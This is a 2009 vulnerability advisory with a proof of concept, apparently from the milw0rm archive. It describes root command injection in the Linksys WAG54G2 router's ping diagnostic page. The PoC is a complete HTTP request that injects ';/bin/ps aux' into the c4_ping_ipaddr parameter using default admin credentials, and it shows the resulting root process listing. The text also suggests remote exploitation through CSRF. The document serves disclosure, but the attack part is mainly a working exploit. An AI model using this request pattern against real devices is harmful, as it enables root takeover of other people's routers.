@@ -1,0 +1,31 @@
+1. Linksys WAG54G2 router is a popular SOHO class device. It provides ADSL / WiFi / Ethernet interfaces.
+
+2. When logged into web management console, it is possible to execute commands as root (tested on firmware: V1.00.10).
+
+3. PoC:
+
+GET /setup.cgi?ping_ipaddr1=1&ping_ipaddr2=1&ping_ipaddr3=1&ping_ipaddr4=1&ping_size=60&ping_number=1&ping_interval=1000&ping_timeout=5000&start=Start+Test&todo=ping_test&this_file=Diagnostics.htm&next_file=Diagnostics.htm&c4_ping_ipaddr=1.1.1.1;/bin/ps aux&message= HTTP/1.1
+Host: 192.168.1.1
+Authorization: Basic YWRtaW46YWRtaW4=
+
+HTTP/1.0 200 OK
+sh: cannot create 1: Unknown error 30
+killall: pingmultilang: no process killed
+killall: 2: no process killed
+  PID  Uid     VmSize Stat Command
+    1 root        284 S   init       
+    2 root            SWN [ksoftirqd/0]
+    3 root            SW< [events/0]
+    4 root            SW< [khelper]
+    5 root            SW< [kthread]
+...
+
+4. Note that it is needed to supply valid user/password (Authorization HTTP header).
+
+5. One could try to exploit this issue remotely (using CRSF) assuming that a victim did not change default password to the web management.
+
+6. The vendor (Cisco) was contacted in march '09 and confirmed the issue (but still it remains unpatched).
+
+7. More detailed information: http://www.securitum.pl/dh/Linksys_WAG54G2_-_escape_to_OS_root
+
+# milw0rm.com [2009-06-01]
